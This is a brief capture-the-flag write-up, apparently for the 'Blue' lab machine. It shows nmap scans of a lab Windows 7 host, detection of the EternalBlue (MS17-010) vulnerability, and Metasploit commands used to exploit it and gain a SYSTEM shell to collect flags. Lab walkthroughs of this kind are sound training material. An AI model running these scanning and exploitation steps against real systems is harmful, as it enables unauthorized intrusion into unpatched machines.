
![[blue logo.png]]


```
nmap -sVC 10.129.32.175 -oN scan.txt
```

```
<SNIP>

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```


```
nmap -sV -p445 10.129.32.175 --script vuln
```

![Pasted image 20260105212302](Pasted%20image%2020260105212302.png)

Eternal Blue

```
mfsconsole -q
```

```
search ms17-010
```

![Pasted image 20260105212348](Pasted%20image%2020260105212348.png)

use 0

We set the option and we run the exploit

![Pasted image 20260105212420](Pasted%20image%2020260105212420.png)

We are in

![Pasted image 20260105212644](Pasted%20image%2020260105212644.png)

And we are system, so we can retrieve the flags on haris's Desktop and Administrator Desktop.

